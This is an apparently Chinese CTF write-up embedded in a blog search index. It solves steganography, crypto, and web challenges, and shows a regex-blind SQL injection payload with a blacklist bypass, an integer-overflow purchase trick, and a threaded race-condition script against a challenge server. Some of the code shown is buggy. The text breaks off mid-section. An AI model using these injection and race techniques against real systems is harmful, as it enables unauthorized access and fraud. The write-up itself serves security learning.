<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020“网鼎杯”HUST校内排位赛-部分WriteUp</title>
    <url>/2020/04/20/2020%E2%80%9C%E7%BD%91%E9%BC%8E%E6%9D%AF%E2%80%9DHUST%E6%A0%A1%E5%86%85%E6%8E%92%E4%BD%8D%E8%B5%9B-%E9%83%A8%E5%88%86WriteUp/</url>
    <content><![CDATA[<p>鲸！萌新的第一次正规CTF，竟然连签到题都没做出来！（Misc1出题人出来挨打</p>
<p>题目好难，体验好差QAQ</p>
<a id="more"></a>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="菜"><a href="#菜" class="headerlink" title="菜"></a>菜</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>是什么蒙蔽了我的双眼，倒数第四个字符是O，根据附件提示解出flag，请提交flag{}内的内容；</p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>拿到题目的Attachment，发现是一张PNG图片。图片只是一张“单纯”的表情包。结合题目提示“蒙蔽双眼”，推测可能是改写了PNG文件头中的图片高度，来实现隐藏部分图片信息</p>
<p>右键查看文件属性，发现文件的高为 <code>730px</code> ,转换为十六进制值为 <code>02 DA</code> 。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Misc_%E8%8F%9C_%E5%9B%BE%E7%89%87%E5%B1%9E%E6%80%A7.png" alt="Misc_菜_图片属性"></p>
            </div>

<p>使用 <a href="http://www.x-ways.net/winhex/" target="_blank" rel="noopener">winhex</a> 打开文件，搜索HEX值为<code>02 DA</code>，并将其修改为 <code>03 DA</code> 以实现将图片拉长的操作</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Misc_%E8%8F%9C_winhex%E4%BF%AE%E6%94%B9.png" alt="Misc_菜_winhex修改"></p>
            </div>

<p>这样拉长之后，就能够得到被隐藏的flag。但是flag实在是太糊了，使用各种软件锐化都没能得出结果。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Misc_%E8%8F%9C_%E5%BE%97%E5%88%B0FLag.png" alt=""></p>
            </div>

<p>后来得知flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">l3hsec&#123;ri1b7FLuoun2ZD0QOyv&#125;</span><br></pre></td></tr></table></figure>

<h4 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h4><ul>
<li><code>PNG</code>文件的文件头是可以被修改以实现显示图像区域的变化，达到隐藏图像信息的目的</li>
</ul>
<h3 id="Boring-exe"><a href="#Boring-exe" class="headerlink" title="Boring_exe"></a>Boring_exe</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>出题人很无聊所以想出了这道题，根据附件提示解出flag，请提交flag{}内的内容；</p>
<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先拿到题目的Attachment，发现是一个exe可执行文件。双击运行，没有任何结果。</p>
<p>之后使用 <a href="http://www.x-ways.net/winhex/" target="_blank" rel="noopener">winhex</a> 打开文件，查看文件内容。下拉发现“有东西”，出现了一个 <code>popi提问箱</code> 链接。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Misc_Boring_exe.jpg" alt="Misc_Boring_exe.jpg"></p>
            </div>

<p>访问该链接，拿到一个<code>fake flag</code></p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Misc_Boring_exe_popi.png" alt="Misc_Boring_exe_popi"></p>
            </div>

<p>但是这个头像操作似曾相识。确认过眼神，是和 <a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5099&page=1" target="_blank" rel="noopener">攻防世界-Misc新手区-give_you_flag</a> 套路一样的题。</p>
<p>右键保存图片，使用 <code>PhotoShop</code> 补全定位符。</p>
<p>用手机扫描即可得到flag</p>
<div class="fancybox ">
              <p><img src="https://gitee.com/Zam-0703/BlogImage/raw/master/img/Misc_Boring_exe_flag.jpg" alt="Misc_Boring_exe_flag"></p>
            </div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">l3hsec&#123;misc_is_funnnnn!&#125;</span><br></pre></td></tr></table></figure>

<h4 id="题目总结-1"><a href="#题目总结-1" class="headerlink" title="题目总结"></a>题目总结</h4><ul>
<li>需要熟练使用 <code>PhotoShop</code> 等软件对图像进行处理</li>
<li>遇到 <code>exe</code> 等文件时不一定非要逆向，没准使用 <code>WinHex</code> 直接查看文件内容会有意想不到的收获</li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h3><h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先打开附件，是一个 <code>java</code> 文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">crypto</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> BigInteger e = <span class="keyword">new</span> BigInteger(<span class="string">"114514"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> BigInteger p = <span class="keyword">new</span> BigInteger(<span class="string">"486782758980265419106566437773662434821707849903209898358740381800342941420169184139234071329598394271286443155137316343275438967772601578029350778343911038446374408250"</span>);</span><br><span class="line">    <span class="keyword">static</span> BigInteger h = <span class="keyword">new</span> BigInteger(<span class="string">"197285815436451554701121357540207727760367215453670717073481761209255345336604283966933286154040618892010511454547717773622062607956598784296775952923998110257788108099"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> String table = <span class="keyword">new</span> String(<span class="string">"0123456789abcdefghijklnmopqrstuvwxyz"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Enc</span><span class="params">(String plaintext)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        BigInteger[] cipher = <span class="keyword">new</span> BigInteger[<span class="number">2</span>];</span><br><span class="line">        plaintext = plaintext.toLowerCase();</span><br><span class="line">        BigInteger r = <span class="keyword">new</span> BigInteger(<span class="keyword">new</span> Random().nextInt(<span class="number">10000000</span>)+<span class="string">""</span>);</span><br><span class="line">        String rtext = r.toString();</span><br><span class="line">        System.out.println(rtext);</span><br><span class="line">        <span class="keyword">int</span> rlen = rtext.length();</span><br><span class="line">        String text = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; plaintext.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = i % rlen;</span><br><span class="line">            text += table.charAt((table.indexOf(plaintext.charAt(i))+Character.getNumericValue(rtext.charAt(j))) % <span class="number">36</span>);</span><br><span class="line">            System.out.println(text);</span><br><span class="line">        &#125;</span><br><span class="line">        BigInteger bText = <span class="keyword">new</span> BigInteger(text, <span class="number">36</span>);</span><br><span class="line">        cipher[<span class="number">0</span>] = e.modPow(r, p);</span><br><span class="line">        cipher[<span class="number">1</span>] = h.modPow(r, p).multiply(bText);</span><br><span class="line">        <span class="keyword">return</span> cipher[<span class="number">0</span>].toString(<span class="number">36</span>)+<span class="string">"||"</span>+cipher[<span class="number">1</span>].toString(<span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Welcome to l3hsec, here is the flag:"</span>);</span><br><span class="line">        String str1 = <span class="string">"This is the flag"</span>;</span><br><span class="line">        String str2 = Enc(str1); <span class="comment">// d4e03ge7tgvd3okpxq1l83w65q7vs55iwcav9ftehw9xtgfkn3oc3ofl2b52c6yjzl0jkn4xl83joqxlq023sacnpeddvq46709bz8kye1da||2h1oufyowds4axcoim3trm3kqm2hwlgbnrnblznktu4960o7hek0n9xgm9h1qfqq5w9k2i8wifbqv22c1mg8a79vwf8z6ydddbghvy3qzyq6jprbsjcv4o3ftwk5nmi</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到 <code>main</code> 函数中的这一段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str2 = Enc(str1); <span class="comment">// d4e03ge7tgvd3okpxq1l83w65q7vs55iwcav9ftehw9xtgfkn3oc3ofl2b52c6yjzl0jkn4xl83joqxlq023sacnpeddvq46709bz8kye1da||2h1oufyowds4axcoim3trm3kqm2hwlgbnrnblznktu4960o7hek0n9xgm9h1qfqq5w9k2i8wifbqv22c1mg8a79vwf8z6ydddbghvy3qzyq6jprbsjcv4o3ftwk5nmi</span></span><br></pre></td></tr></table></figure>

<p>与 <code>Enc</code> 函数中的这一段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> cipher[<span class="number">0</span>].toString(<span class="number">36</span>)+<span class="string">"||"</span>+cipher[<span class="number">1</span>].toString(<span class="number">36</span>);</span><br></pre></td></tr></table></figure>

<p>很自然地猜想，注释||前边的那一串108位的字符串就是cipher[0]。</p>
<p>然后注意到 <code>Enc</code> 函数中的这一段代码。这段代码就是产生密文。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cipher[<span class="number">0</span>] = e.modPow(r, p);</span><br><span class="line">cipher[<span class="number">1</span>] = h.modPow(r, p).multiply(bText);</span><br></pre></td></tr></table></figure>

<p><code>e</code>, <code>p</code>, <code>h</code>是题目中已知的三个常量。因此解密的重心就放在了如何求出 <code>r</code> 这个变量上。可以写一段代码，暴力枚举出 <code>r</code> 的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">crypto</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> BigInteger e = <span class="keyword">new</span> BigInteger(<span class="string">"114514"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> BigInteger p = <span class="keyword">new</span> BigInteger(<span class="string">"486782758980265419106566437773662434821707849903209898358740381800342941420169184139234071329598394271286443155137316343275438967772601578029350778343911038446374408250"</span>);</span><br><span class="line">    <span class="keyword">static</span> BigInteger h = <span class="keyword">new</span> BigInteger(<span class="string">"197285815436451554701121357540207727760367215453670717073481761209255345336604283966933286154040618892010511454547717773622062607956598784296775952923998110257788108099"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String str1 = <span class="string">"d4e03ge7tgvd3okpxq1l83w65q7vs55iwcav9ftehw9xtgfkn3oc3ofl2b52c6yjzl0jkn4xl83joqxlq023sacnpeddvq46709bz8kye1da"</span>;</span><br><span class="line">		BigInteger cipher=<span class="keyword">new</span> BigInteger(str1, <span class="number">36</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10000000</span>;i++)&#123;</span><br><span class="line">            BigInteger Z= <span class="keyword">new</span> BigInteger(i+<span class="string">""</span> );</span><br><span class="line">            BigInteger th = e.modPow(z,p);;</span><br><span class="line">            <span class="keyword">if</span>(th.tostring(<span class="number">36</span>).equals(cipher))</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到 <code>r</code> 的值为 <code>6994579</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cipher[<span class="number">1</span>] = h.modPow(r, p).multiply(bText);</span><br></pre></td></tr></table></figure>

<p>根据以上代码，求得 <code>r</code> 后就可以求出 <code>bText</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigInteger bText = <span class="keyword">new</span> BigInteger(text, <span class="number">36</span>);</span><br></pre></td></tr></table></figure>

<p>然后就可以求出 <code>text</code> 为<code>i07tyvryvxxyojzqjvi</code>。再根据以下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> String table = <span class="keyword">new</span> String(<span class="string">"0123456789abcdefghijklnmopqrstuvwxyz"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; plaintext.length(); i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> j = i % rlen;</span><br><span class="line">    text += table.charAt((table.indexOf(plaintext.charAt(i))+Character.getNumericValue(rtext.charAt(j))) % <span class="number">36</span>);</span><br><span class="line">    System.out.println(text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就可以由 <code>text</code> 反推出 <code>plaintext</code>，得到 <code>flag</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cryptoisnotthathard</span><br></pre></td></tr></table></figure>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>居然有这么简单的SQL注入，请提交flag{}内的内容</p>
<h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先，打开在线测试环境。是一段 <code>PHP</code> 代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"./flag.php"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$username = $_REQUEST[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_REQUEST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($username) || !<span class="keyword">isset</span>($passwd)) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $blacklist = <span class="string">"/admin|limit|by|substr|mid|like|or|char|union|select|greatest|\'|=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match($blacklist, $username) || preg_match($blacklist, $passwd)) <span class="keyword">exit</span>(<span class="string">"Try harder"</span>);</span><br><span class="line"></span><br><span class="line">    $queryuser = <span class="string">"select username from admin where username='$username' and passwd='$passwd'"</span>;</span><br><span class="line"></span><br><span class="line">    $userresult = mysqli_fetch_array(mysqli_query($conn, $queryuser), MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">    $querypass = <span class="string">"select passwd from admin where username='admin'"</span>;</span><br><span class="line"></span><br><span class="line">    $passresult = mysqli_fetch_array(mysqli_query($conn, $querypass), MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;username:$username&lt;br&gt;&lt;/h1&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;passwd:$passwd&lt;br&gt;&lt;/h1&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($userresult[<span class="string">'username'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Welcome &#123;$userresult['username']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (($passresult[<span class="string">'passwd'</span>]) &amp;&amp; (strtolower($passresult[<span class="string">'passwd'</span>]) === strtolower($passwd))) <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试直接访问 <code>flag.php</code> ，没有任何反应。并且，结合题目提示，分析重心集中在SQL注入上。</p>
<p>首先关注到 <code>$blacklist</code> 。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$blacklist = <span class="string">"/admin|limit|by|substr|mid|like|or|char|union|select|greatest|\'|=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span></span><br></pre></td></tr></table></figure>

<p>有一说一，这么长的正则，基本上把可能的平常用的注入操作都屏蔽了。因此需要使用SQL正则盲注这样的姿势。</p>
<p>然后注意到 <code>$quertpass</code> 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$querypass = <span class="string">"select passwd from admin where username='admin'"</span>;</span><br></pre></td></tr></table></figure>

<p>并且下边的 <code>if</code> 判断中，还出现了 <code>flag</code> 的身影。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (($passresult[<span class="string">'passwd'</span>]) &amp;&amp; (strtolower($passresult[<span class="string">'passwd'</span>]) === strtolower($passwd))) <span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>

<p>这说明，我们需要找到的，是 <code>admin</code> 用户的 <code>password</code>。并且，最后不管登录的用户是谁，只需要知道  <code>admin</code> 用户的 <code>password</code> ,且 <code>username</code> 不为空，就可以显示 <code>$flag</code>。并且，该密码是小写的。</p>
<p>并且，题目中的SQL语句是这样的：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> passwd=<span class="string">'$passwd'</span></span><br></pre></td></tr></table></figure>

<p>由于在 <code>$blacklist</code> 中过滤了空格，就使用/**/绕过。过滤了# - ，就使用;%00绕过。</p>
<p>因此，可以构造Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;\&amp;passwd&#x3D;||passwd&#x2F;**&#x2F;REGEXP&#x2F;**&#x2F;&quot;^w&quot;;%00</span><br></pre></td></tr></table></figure>

<p>之后就可以使用 <a href="https://portswigger.net/burp/" target="_blank" rel="noopener">BurpSuite</a> 进行爆破。</p>
<div class="fancybox ">
              <p><img src="https://gitee.com/Zam-0703/BlogImage/raw/master/img/Web1%E7%88%86%E7%A0%B4.png" alt="Web1爆破"></p>
            </div>

<p>字典设置为 <code>0-9,a-z</code> 。将 <code>Response</code> 按长度排列。可以发现，长度较长的就是匹配爆破成功的 <code>Response</code>。</p>
<div class="fancybox ">
              <p><img src="https://gitee.com/Zam-0703/BlogImage/raw/master/img/Web1%E7%88%86%E7%A0%B41.png" alt="Web1爆破1"></p>
            </div>

<p>从这里可以看出，密码的第一位为6。然后，将 <code>QueryString Payload</code> 中的正则表达式更改成 <code>^6w</code>，继续匹配第二位密码</p>
<div class="fancybox ">
              <p><img src="https://gitee.com/Zam-0703/BlogImage/raw/master/img/Web1%E7%88%86%E7%A0%B42.png" alt="Web1爆破2"></p>
            </div>

<p>从这里可以看出，密码的第二位是8。然后依此类推，将密码的所有位都匹配出来</p>
<div class="fancybox ">
              <p><img src="https://gitee.com/Zam-0703/BlogImage/raw/master/img/Web1%E7%88%86%E7%A0%B4%E6%9C%80%E7%BB%88.png" alt="Web1爆破最终"></p>
            </div>

<p>得到最终的 <code>passwd</code> : <code>68656c6c6f6279797a64646d7236</code>。传入非空的 <code>username</code> 以及该 <code>passwd</code> 即得到最终的 <code>flag</code>。</p>
<div class="fancybox ">
              <p><img src="https://gitee.com/Zam-0703/BlogImage/raw/master/img/Web1_flag.png" alt="Web1_flag"></p>
            </div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;957150780883bae6c3e11cf0e4f9d6d1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="题目总结-2"><a href="#题目总结-2" class="headerlink" title="题目总结"></a>题目总结</h4><ul>
<li>无论遇到什么样的正则过滤，都不要怕，微笑着面对他，消除正则的最好办法就是要用正则勇敢地击败它！</li>
</ul>
<h3 id="你想吃麻辣香锅吗"><a href="#你想吃麻辣香锅吗" class="headerlink" title="你想吃麻辣香锅吗"></a>你想吃麻辣香锅吗</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>Naivekun最喜欢吃麻辣香锅了，你能帮帮他吗？请提交flag{}内的内容；</p>
<h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先进入在线测试环境，得到如下菜单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/ 主页</span><br><span class="line">/free 白嫖同学饭卡</span><br><span class="line">/list 列出菜单</span><br><span class="line">/add 点菜</span><br><span class="line">/delete 取消点菜</span><br><span class="line">/checkout 查看已点的菜</span><br><span class="line">/exit 跑路，不吃了！</span><br><span class="line">/hint 香锅食用指南</span><br></pre></td></tr></table></figure>

<p>既然有 <code>hint</code>，那肯定得先看看 <code>hint</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7fffffff</span><br></pre></td></tr></table></figure>

<p>那么再 <code>/list</code> 看看菜单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">点菜方式 /add?name=点啥&amp;count=点几个</span><br><span class="line"></span><br><span class="line">name: Ghost_pepper</span><br><span class="line">price: 1</span><br><span class="line"></span><br><span class="line">name: Green_pepper</span><br><span class="line">price: 5</span><br><span class="line"></span><br><span class="line">name: Jolokia</span><br><span class="line">price: 10</span><br><span class="line"></span><br><span class="line">name: Hack_pepper</span><br><span class="line">price: 30</span><br><span class="line"></span><br><span class="line">name: Flag_pepper</span><br><span class="line">price: 31</span><br></pre></td></tr></table></figure>

<p>那么很明显，我们需要购买的就是这个 <code>Flag_pepper</code> 。</p>
<p>然而事情并没有那么简单，当我们在使用 <code>/free</code> 白嫖同学饭卡来增加余额时，余额增加到30之后就不会再增加了，这样就购买不了Flag_pepper。</p>
<div class="fancybox ">
              <p><img src="https://gitee.com/Zam-0703/BlogImage/raw/master/img/Web_%E9%A6%99%E9%94%85_%E7%99%BD%E5%AB%96%E5%A4%B1%E8%B4%A5.png" alt="Web_香锅_白嫖失败"></p>
            </div>

<p>于是乎，联想之前给的 <code>hint</code>-<code>0x7fffffff</code> 猜测是否是需要请求购买一个数额巨大的商品，导致结算时商品金额溢出，以实现<strong>购买不要钱/倒贴钱</strong>的操作。</p>
<p>在尝试了多次之后，发现直接购买数额巨大的 <code>Flag_pepper</code> 是不可行的，推测后台对当前余额与商品价格之间先做了判断，当当前余额小于商品价格时就会直接报错。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_%E9%A6%99%E9%94%854.png" alt="Web_香锅4"></p>
            </div>

<p>因此，尝试使用购买大量的<code>Hack pepper</code>来使结算时商品金额溢出，以实现<strong>购买倒贴钱</strong>。经过尝试，发现当 <code>count</code> 金额足够大时，会溢出导致余额不减反增。(u1s1,买的菜不让退属实奸商)</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_%E9%A6%99%E9%94%851.png" alt="Web_香锅1"></p>
            </div>

<p>这时去购买一个 <code>Flag_pepper</code> ，就购买成功了。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_%E9%A6%99%E9%94%852.png" alt="Web_香锅2"></p>
            </div>

<p>再访问 <code>/checkout</code> 查看自己点的菜，flag就出现了。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_%E9%A6%99%E9%94%853.png" alt="Web_香锅3"></p>
            </div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;naivekun_wanna_a_g1rlfriend_2333&#125;</span><br></pre></td></tr></table></figure>

<h4 id="题目总结-3"><a href="#题目总结-3" class="headerlink" title="题目总结"></a>题目总结</h4><ul>
<li>整型溢出是个好东西，当数值过大的时候计算结果可能就会和预想的不一致。白嫖谁不喜欢呢 \滑稽</li>
</ul>
<h3 id="你真的想吃麻辣香锅吗"><a href="#你真的想吃麻辣香锅吗" class="headerlink" title="你真的想吃麻辣香锅吗"></a>你真的想吃麻辣香锅吗</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>Naivekun最最最最最最喜欢吃麻辣香锅了，你能帮帮他吗？请提交flag{}内的内容；</p>
<h4 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先进入在线测试环境，和“小香锅”差不多，得到如下菜单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/ 主页</span><br><span class="line">/free 白嫖同学饭卡</span><br><span class="line">/list 列出菜单</span><br><span class="line">/add 点菜</span><br><span class="line">/delete 取消点菜</span><br><span class="line">/checkout 查看已点的菜</span><br><span class="line">/exit 跑路，不吃了！</span><br><span class="line">/hint 香锅食用指南</span><br></pre></td></tr></table></figure>

<p>既然有 <code>hint</code>，那肯定得先看看 <code>hint</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你知道mutex吗</span><br></pre></td></tr></table></figure>

<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_%E8%B6%85%E7%BA%A7%E9%A6%99%E9%94%85.png" alt="Web_超级香锅"></p>
            </div>

<p>那么再 <code>/list</code> 看看菜单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">点菜方式 /add?name=点啥&amp;count=点几个</span><br><span class="line"></span><br><span class="line">name: Ghost_pepper</span><br><span class="line">price: 1</span><br><span class="line"></span><br><span class="line">name: Green_pepper</span><br><span class="line">price: 5</span><br><span class="line"></span><br><span class="line">name: Jolokia</span><br><span class="line">price: 10</span><br><span class="line"></span><br><span class="line">name: Hack_pepper</span><br><span class="line">price: 30</span><br><span class="line"></span><br><span class="line">name: Flag_pepper</span><br><span class="line">price: 31</span><br></pre></td></tr></table></figure>

<p>那么很明显，和之前的题目一样，我们需要购买的还是这个 <code>Flag_pepper</code> 。</p>
<p>首先试试在之前题目的 Trick 还能不能起作用。然而，这次似乎在数据上做了处理，不会像之前一样，存在着数据溢出的问题</p>
<div class="fancybox ">
              <p><img src="https://gitee.com/Zam-0703/BlogImage/raw/master/img/Web_%E8%B6%85%E7%BA%A7%E9%A6%99%E9%94%85_%E6%BA%A2%E5%87%BA%E5%A4%B1%E8%B4%A5.png" alt="Web_超级香锅_溢出失败"></p>
            </div>

<p>于是乎，联想之前给的 <code>hint</code>-<code>mutex</code>锁，猜测是否网站后端设计有缺陷，使用了多线程来提高并发的同时并没有对线程上线程锁，导致我们同时访问 <code>\free</code> 时，多个线程同时修改一个变量，有可能可以突破白嫖30元的上限。</p>
<p>因此，记录下我们访问这个网站时的 <code>cookie</code> 。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_%E8%B6%85%E7%BA%A7%E9%A6%99%E9%94%851.png" alt="Web_超级香锅1"></p>
            </div>

<p>直接写一个简单的 Python 脚本，使用 <code>threading</code> 和 <code>requests</code>，模块，并将 <code>cookie</code> 填入，来多线程白嫖</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,threading</span><br><span class="line"></span><br><span class="line">api = <span class="string">"http://124.193.74.212:5517/free"</span></span><br><span class="line">_cookies = &#123;<span class="string">'session'</span>:<span class="string">'MTU4NzIwNDY4NXxOd3dBTkRWSVRsSkxTRkJhVTB4UlFrMUZWVE5TU3pVelZUVlZWRlJJVUV0VFQxcEtOalEwVVUwMVZVUlRObGxaU2xsU05WRTBWMEU9fMVdDcSNCc2rhG3LHlUyPQBd0n5zMhdWiH8jB2nQOLxF'</span>&#125;<span class="comment">#这里填入浏览器中的cookie</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span> <span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="number">3</span>:</span><br><span class="line">        requests.get(api,cookies=_cookies)</span><br><span class="line">        n++</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=free)</span><br><span class="line">t2 = threading.Thread(target=free)</span><br><span class="line">t3 = threading.Thread(target=free)</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">t3.start()</span><br><span class="line">t1.join()</span><br><span class="line">t2.join()</span><br><span class="line">t3.join()</span><br></pre></td></tr></table></figure>

<p>然后我们的余额就有90了，愉快地购买了 <code>Flag pepper</code></p>
<div class="fancybox ">
